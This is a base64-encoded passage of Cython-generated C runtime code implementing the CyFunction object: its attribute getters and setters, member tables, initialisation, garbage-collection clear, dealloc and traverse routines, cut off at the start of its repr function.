X0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Fubm90YXRpb25zX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkgewogICAgUHlPYmplY3QqIHJlc3VsdCA9IG9wLT5mdW5jX2Fubm90YXRpb25zOwogICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKSB7CiAgICAgICAgcmVzdWx0ID0gUHlEaWN0X05ldygpOwogICAgICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkgcmV0dXJuIE5VTEw7CiAgICAgICAgb3AtPmZ1bmNfYW5ub3RhdGlvbnMgPSByZXN1bHQ7CiAgICB9CiAgICBQeV9JTkNSRUYocmVzdWx0KTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnNfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZV92YWx1ZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkgewogICAgaW50IGlzX2Nvcm91dGluZSA9IG9wLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ09ST1VUSU5FOwogICAgaWYgKGlzX2Nvcm91dGluZSkgewogICAgICAgIFB5T2JqZWN0ICppc19jb3JvdXRpbmVfdmFsdWUsICptb2R1bGUsICpmcm9tbGlzdCwgKm1hcmtlciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pc19jb3JvdXRpbmU7CiAgICAgICAgZnJvbWxpc3QgPSBQeUxpc3RfTmV3KDEpOwogICAgICAgIGlmICh1bmxpa2VseSghZnJvbWxpc3QpKSByZXR1cm4gTlVMTDsKICAgICAgICBQeV9JTkNSRUYobWFya2VyKTsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICBQeUxpc3RfU0VUX0lURU0oZnJvbWxpc3QsIDAsIG1hcmtlcik7CiNlbHNlCiAgICAgICAgaWYgKHVubGlrZWx5KFB5TGlzdF9TZXRJdGVtKGZyb21saXN0LCAwLCBtYXJrZXIpIDwgMCkpIHsKICAgICAgICAgICAgUHlfREVDUkVGKG1hcmtlcik7CiAgICAgICAgICAgIFB5X0RFQ1JFRihmcm9tbGlzdCk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KI2VuZGlmCiAgICAgICAgbW9kdWxlID0gUHlJbXBvcnRfSW1wb3J0TW9kdWxlTGV2ZWxPYmplY3QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FzeW5jaW9fY29yb3V0aW5lcywgTlVMTCwgTlVMTCwgZnJvbWxpc3QsIDApOwogICAgICAgIFB5X0RFQ1JFRihmcm9tbGlzdCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSBnb3RvIGlnbm9yZTsKICAgICAgICBpc19jb3JvdXRpbmVfdmFsdWUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG1vZHVsZSwgbWFya2VyKTsKICAgICAgICBQeV9ERUNSRUYobW9kdWxlKTsKICAgICAgICBpZiAobGlrZWx5KGlzX2Nvcm91dGluZV92YWx1ZSkpIHsKICAgICAgICAgICAgcmV0dXJuIGlzX2Nvcm91dGluZV92YWx1ZTsKICAgICAgICB9Cmlnbm9yZToKICAgICAgICBQeUVycl9DbGVhcigpOwogICAgfQogICAgcmV0dXJuIF9fUHl4X1B5Qm9vbF9Gcm9tTG9uZyhpc19jb3JvdXRpbmUpOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKG9wLT5mdW5jX2lzX2Nvcm91dGluZSkgewogICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYob3AtPmZ1bmNfaXNfY29yb3V0aW5lKTsKICAgIH0KICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZV92YWx1ZShvcCk7CiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIGlmIChvcC0+ZnVuY19pc19jb3JvdXRpbmUpIHsKICAgICAgICBQeV9ERUNSRUYocmVzdWx0KTsKICAgICAgICByZXN1bHQgPSBfX1B5eF9OZXdSZWYob3AtPmZ1bmNfaXNfY29yb3V0aW5lKTsKICAgIH0gZWxzZSB7CiAgICAgICAgb3AtPmZ1bmNfaXNfY29yb3V0aW5lID0gX19QeXhfTmV3UmVmKHJlc3VsdCk7CiAgICB9CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmZ1bmMsIGNvbnN0IGNoYXIqIG1lc3NhZ2UsIFB5X3NzaXplX3Qgc2l6ZSkgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlPYmplY3QgKnB5X25hbWUgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lKGZ1bmMsIE5VTEwpOwogICAgaWYgKCFweV9uYW1lKSByZXR1cm47CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICIlLjIwMFMoKSAlcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsCiAgICAgICAgcHlfbmFtZSwgbWVzc2FnZSwgc2l6ZSk7CiAgICBQeV9ERUNSRUYocHlfbmFtZSk7CiNlbHNlCiAgICBjb25zdCBjaGFyKiBuYW1lID0gKChQeUNGdW5jdGlvbk9iamVjdCopZnVuYyktPm1fbWwtPm1sX25hbWU7CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICIlLjIwMHMoKSAlcyAoJSIgQ1lUSE9OX0ZPUk1BVF9TU0laRV9UICJkIGdpdmVuKSIsCiAgICAgICAgbmFtZSwgbWVzc2FnZSwgc2l6ZSk7CiNlbmRpZgp9CnN0YXRpYyB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfdHlwZV9lcnJvcihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpmdW5jLCBjb25zdCBjaGFyKiBtZXNzYWdlKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeU9iamVjdCAqcHlfbmFtZSA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUoZnVuYywgTlVMTCk7CiAgICBpZiAoIXB5X25hbWUpIHJldHVybjsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgIiUuMjAwUygpICVzIiwKICAgICAgICBweV9uYW1lLCBtZXNzYWdlKTsKICAgIFB5X0RFQ1JFRihweV9uYW1lKTsKI2Vsc2UKICAgIGNvbnN0IGNoYXIqIG5hbWUgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jKS0+bV9tbC0+bWxfbmFtZTsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgIiUuMjAwcygpICVzIiwKICAgICAgICBuYW1lLCBtZXNzYWdlKTsKI2VuZGlmCn0KI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfbW9kdWxlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIHJldHVybiBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKG9wLT5mdW5jLCAiX19tb2R1bGVfXyIpOwp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfbW9kdWxlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCogdmFsdWUsIHZvaWQgKmNvbnRleHQpIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgcmV0dXJuIFB5T2JqZWN0X1NldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX21vZHVsZV9fIiwgdmFsdWUpOwp9CiNlbmRpZgpzdGF0aWMgUHlHZXRTZXREZWYgX19weXhfQ3lGdW5jdGlvbl9nZXRzZXRzW10gPSB7CiAgICB7ImZ1bmNfZG9jIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kb2MsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfZG9jLCAwLCAwfSwKICAgIHsiX19kb2NfXyIsICAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kb2MsIDAsIDB9LAogICAgeyJmdW5jX25hbWUiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbmFtZSwgMCwgMH0sCiAgICB7Il9fbmFtZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X25hbWUsIDAsIDB9LAogICAgeyJfX3F1YWxuYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X3F1YWxuYW1lLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X3F1YWxuYW1lLCAwLCAwfSwKICAgIHsiZnVuY19kaWN0IiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0LCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RpY3QsIDAsIDB9LAogICAgeyJfX2RpY3RfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdCwgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kaWN0LCAwLCAwfSwKICAgIHsiZnVuY19nbG9iYWxzIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9nbG9iYWxzLCAwLCAwLCAwfSwKICAgIHsiX19nbG9iYWxzX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2dsb2JhbHMsIDAsIDAsIDB9LAogICAgeyJmdW5jX2Nsb3N1cmUiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Nsb3N1cmUsIDAsIDAsIDB9LAogICAgeyJfX2Nsb3N1cmVfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY2xvc3VyZSwgMCwgMCwgMH0sCiAgICB7ImZ1bmNfY29kZSIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY29kZSwgMCwgMCwgMH0sCiAgICB7Il9fY29kZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9jb2RlLCAwLCAwLCAwfSwKICAgIHsiZnVuY19kZWZhdWx0cyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfZGVmYXVsdHMsIDAsIDB9LAogICAgeyJfX2RlZmF1bHRzX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RlZmF1bHRzLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RlZmF1bHRzLCAwLCAwfSwKICAgIHsiX19rd2RlZmF1bHRzX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2t3ZGVmYXVsdHMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfa3dkZWZhdWx0cywgMCwgMH0sCiAgICB7Il9fYW5ub3RhdGlvbnNfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfYW5ub3RhdGlvbnMsIDAsIDB9LAogICAgeyJfaXNfY29yb3V0aW5lIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9pc19jb3JvdXRpbmUsIDAsIDAsIDB9LAojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgeyJfX21vZHVsZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9tb2R1bGUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbW9kdWxlLCAwLCAwfSwKI2VuZGlmCiAgICB7MCwgMCwgMCwgMCwgMH0KfTsKc3RhdGljIFB5TWVtYmVyRGVmIF9fcHl4X0N5RnVuY3Rpb25fbWVtYmVyc1tdID0gewojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHsiX19tb2R1bGVfXyIsIFRfT0JKRUNULCBvZmZzZXRvZihQeUNGdW5jdGlvbk9iamVjdCwgbV9tb2R1bGUpLCAwLCAwfSwKI2VuZGlmCiAgICB7Il9fZGljdG9mZnNldF9fIiwgVF9QWVNTSVpFVCwgb2Zmc2V0b2YoX19weXhfQ3lGdW5jdGlvbk9iamVjdCwgZnVuY19kaWN0KSwgUkVBRE9OTFksIDB9LAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHsiX192ZWN0b3JjYWxsb2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBmdW5jX3ZlY3RvcmNhbGwpLCBSRUFET05MWSwgMH0sCiNlbHNlCiAgICB7Il9fdmVjdG9yY2FsbG9mZnNldF9fIiwgVF9QWVNTSVpFVCwgb2Zmc2V0b2YoUHlDRnVuY3Rpb25PYmplY3QsIHZlY3RvcmNhbGwpLCBSRUFET05MWSwgMH0sCiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBmdW5jX3dlYWtyZWZsaXN0KSwgUkVBRE9OTFksIDB9LAojZWxzZQogICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihQeUNGdW5jdGlvbk9iamVjdCwgbV93ZWFrcmVmbGlzdCksIFJFQURPTkxZLCAwfSwKI2VuZGlmCiNlbmRpZgogICAgezAsIDAsIDAsICAwLCAwfQp9OwpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX3JlZHVjZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptLCBQeU9iamVjdCAqYXJncykKewogICAgUHlPYmplY3QgKnJlc3VsdCA9IE5VTEw7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihhcmdzKTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04obSk7CiAgICBQeV9JTkNSRUYobS0+ZnVuY19xdWFsbmFtZSk7CiAgICByZXN1bHQgPSBtLT5mdW5jX3F1YWxuYW1lOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X0N5RnVuY3Rpb25fbWV0aG9kc1tdID0gewogICAgeyJfX3JlZHVjZV9fIiwgKFB5Q0Z1bmN0aW9uKV9fUHl4X0N5RnVuY3Rpb25fcmVkdWNlLCBNRVRIX1ZBUkFSR1MsIDB9LAogICAgezAsIDAsIDAsIDB9Cn07CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl93ZWFrcmVmbGlzdChjeWZ1bmMpICgoY3lmdW5jKS0+ZnVuY193ZWFrcmVmbGlzdCkKI2Vsc2UKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX3dlYWtyZWZsaXN0KGN5ZnVuYykgKCgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fd2Vha3JlZmxpc3QpCiNlbmRpZgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fSW5pdChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlNZXRob2REZWYgKm1sLCBpbnQgZmxhZ3MsIFB5T2JqZWN0KiBxdWFsbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNsb3N1cmUsIFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0KiBnbG9iYWxzLCBQeU9iamVjdCogY29kZSkgewojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5Q0Z1bmN0aW9uT2JqZWN0ICpjZiA9IChQeUNGdW5jdGlvbk9iamVjdCopIG9wOwojZW5kaWYKICAgIGlmICh1bmxpa2VseShvcCA9PSBOVUxMKSkKICAgICAgICByZXR1cm4gTlVMTDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIG9wLT5mdW5jID0gUHlDRnVuY3Rpb25fTmV3RXgobWwsIChQeU9iamVjdCopb3AsIG1vZHVsZSk7CiAgICBpZiAodW5saWtlbHkoIW9wLT5mdW5jKSkgcmV0dXJuIE5VTEw7CiNlbmRpZgogICAgb3AtPmZsYWdzID0gZmxhZ3M7CiAgICBfX1B5eF9DeUZ1bmN0aW9uX3dlYWtyZWZsaXN0KG9wKSA9IE5VTEw7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgY2YtPm1fbWwgPSBtbDsKICAgIGNmLT5tX3NlbGYgPSAoUHlPYmplY3QgKikgb3A7CiNlbmRpZgogICAgUHlfWElOQ1JFRihjbG9zdXJlKTsKICAgIG9wLT5mdW5jX2Nsb3N1cmUgPSBjbG9zdXJlOwojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X1hJTkNSRUYobW9kdWxlKTsKICAgIGNmLT5tX21vZHVsZSA9IG1vZHVsZTsKI2VuZGlmCiAgICBvcC0+ZnVuY19kaWN0ID0gTlVMTDsKICAgIG9wLT5mdW5jX25hbWUgPSBOVUxMOwogICAgUHlfSU5DUkVGKHF1YWxuYW1lKTsKICAgIG9wLT5mdW5jX3F1YWxuYW1lID0gcXVhbG5hbWU7CiAgICBvcC0+ZnVuY19kb2MgPSBOVUxMOwojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIG9wLT5mdW5jX2NsYXNzb2JqID0gTlVMTDsKI2Vsc2UKICAgICgoUHlDTWV0aG9kT2JqZWN0KilvcCktPm1tX2NsYXNzID0gTlVMTDsKI2VuZGlmCiAgICBvcC0+ZnVuY19nbG9iYWxzID0gZ2xvYmFsczsKICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19nbG9iYWxzKTsKICAgIFB5X1hJTkNSRUYoY29kZSk7CiAgICBvcC0+ZnVuY19jb2RlID0gY29kZTsKICAgIG9wLT5kZWZhdWx0cyA9IE5VTEw7CiAgICBvcC0+ZGVmYXVsdHNfdHVwbGUgPSBOVUxMOwogICAgb3AtPmRlZmF1bHRzX2t3ZGljdCA9IE5VTEw7CiAgICBvcC0+ZGVmYXVsdHNfZ2V0dGVyID0gTlVMTDsKICAgIG9wLT5mdW5jX2Fubm90YXRpb25zID0gTlVMTDsKICAgIG9wLT5mdW5jX2lzX2Nvcm91dGluZSA9IE5VTEw7CiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICAgc3dpdGNoIChtbC0+bWxfZmxhZ3MgJiAoTUVUSF9WQVJBUkdTIHwgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfTk9BUkdTIHwgTUVUSF9PIHwgTUVUSF9LRVlXT1JEUyB8IE1FVEhfTUVUSE9EKSkgewogICAgY2FzZSBNRVRIX05PQVJHUzoKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTk9BUkdTOwogICAgICAgIGJyZWFrOwogICAgY2FzZSBNRVRIX086CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX087CiAgICAgICAgYnJlYWs7CiAgICBjYXNlIE1FVEhfTUVUSE9EIHwgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfS0VZV09SRFM6CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTX01FVEhPRDsKICAgICAgICBicmVhazsKICAgIGNhc2UgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfS0VZV09SRFM6CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTOwogICAgICAgIGJyZWFrOwogICAgY2FzZSBNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTOgogICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKG9wKSA9IE5VTEw7CiAgICAgICAgYnJlYWs7CiAgICBkZWZhdWx0OgogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19TeXN0ZW1FcnJvciwgIkJhZCBjYWxsIGZsYWdzIGZvciBDeUZ1bmN0aW9uIik7CiAgICAgICAgUHlfREVDUkVGKG9wKTsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KI2VuZGlmCiAgICByZXR1cm4gKFB5T2JqZWN0ICopIG9wOwp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9jbGVhcihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptKQp7CiAgICBQeV9DTEVBUihtLT5mdW5jX2Nsb3N1cmUpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlfQ0xFQVIobS0+ZnVuYyk7CiNlbHNlCiAgICBQeV9DTEVBUigoKFB5Q0Z1bmN0aW9uT2JqZWN0KiltKS0+bV9tb2R1bGUpOwojZW5kaWYKICAgIFB5X0NMRUFSKG0tPmZ1bmNfZGljdCk7CiAgICBQeV9DTEVBUihtLT5mdW5jX25hbWUpOwogICAgUHlfQ0xFQVIobS0+ZnVuY19xdWFsbmFtZSk7CiAgICBQeV9DTEVBUihtLT5mdW5jX2RvYyk7CiAgICBQeV9DTEVBUihtLT5mdW5jX2dsb2JhbHMpOwogICAgUHlfQ0xFQVIobS0+ZnVuY19jb2RlKTsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjEKICAgIFB5X0NMRUFSKF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmoobSkpOwojZWxzZQogICAgewogICAgICAgIFB5T2JqZWN0ICpjbHMgPSAoUHlPYmplY3QqKSAoKFB5Q01ldGhvZE9iamVjdCAqKSAobSkpLT5tbV9jbGFzczsKICAgICAgICAoKFB5Q01ldGhvZE9iamVjdCAqKSAobSkpLT5tbV9jbGFzcyA9IE5VTEw7CiAgICAgICAgUHlfWERFQ1JFRihjbHMpOwogICAgfQojZW5kaWYKI2VuZGlmCiAgICBQeV9DTEVBUihtLT5kZWZhdWx0c190dXBsZSk7CiAgICBQeV9DTEVBUihtLT5kZWZhdWx0c19rd2RpY3QpOwogICAgUHlfQ0xFQVIobS0+ZnVuY19hbm5vdGF0aW9ucyk7CiAgICBQeV9DTEVBUihtLT5mdW5jX2lzX2Nvcm91dGluZSk7CiAgICBQeV9DTEVBUihtLT5kZWZhdWx0cyk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9fQ3lGdW5jdGlvbl9kZWFsbG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0pCnsKICAgIGlmIChfX1B5eF9DeUZ1bmN0aW9uX3dlYWtyZWZsaXN0KG0pICE9IE5VTEwpCiAgICAgICAgUHlPYmplY3RfQ2xlYXJXZWFrUmVmcygoUHlPYmplY3QgKikgbSk7CiAgICBfX1B5eF9DeUZ1bmN0aW9uX2NsZWFyKG0pOwogICAgX19QeXhfUHlIZWFwVHlwZU9iamVjdF9HQ19EZWwobSk7Cn0Kc3RhdGljIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9kZWFsbG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0pCnsKICAgIFB5T2JqZWN0X0dDX1VuVHJhY2sobSk7CiAgICBfX1B5eF9fQ3lGdW5jdGlvbl9kZWFsbG9jKG0pOwp9CnN0YXRpYyBpbnQgX19QeXhfQ3lGdW5jdGlvbl90cmF2ZXJzZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykKewogICAgewogICAgICAgIGludCBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKChQeU9iamVjdCopbSwgMSwgdmlzaXQsIGFyZyk7CiAgICAgICAgaWYgKGUpIHJldHVybiBlOwogICAgfQogICAgUHlfVklTSVQobS0+ZnVuY19jbG9zdXJlKTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X1ZJU0lUKG0tPmZ1bmMpOwojZWxzZQogICAgUHlfVklTSVQoKChQeUNGdW5jdGlvbk9iamVjdCopbSktPm1fbW9kdWxlKTsKI2VuZGlmCiAgICBQeV9WSVNJVChtLT5mdW5jX2RpY3QpOwogICAgX19QeXhfVklTSVRfQ09OU1QobS0+ZnVuY19uYW1lKTsKICAgIF9fUHl4X1ZJU0lUX0NPTlNUKG0tPmZ1bmNfcXVhbG5hbWUpOwogICAgUHlfVklTSVQobS0+ZnVuY19kb2MpOwogICAgUHlfVklTSVQobS0+ZnVuY19nbG9iYWxzKTsKICAgIF9fUHl4X1ZJU0lUX0NPTlNUKG0tPmZ1bmNfY29kZSk7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlfVklTSVQoX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihtKSk7CiNlbmRpZgogICAgUHlfVklTSVQobS0+ZGVmYXVsdHNfdHVwbGUpOwogICAgUHlfVklTSVQobS0+ZGVmYXVsdHNfa3dkaWN0KTsKICAgIFB5X1ZJU0lUKG0tPmZ1bmNfaXNfY29yb3V0aW5lKTsKICAgIFB5X1ZJU0lUKG0tPmRlZmF1bHRzKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCoKX19QeXhfQ3lGdW5jdGlvbl9yZXByKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKQp7CiAgICBQeU9iamVjdCAqcmVwcjsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3Ap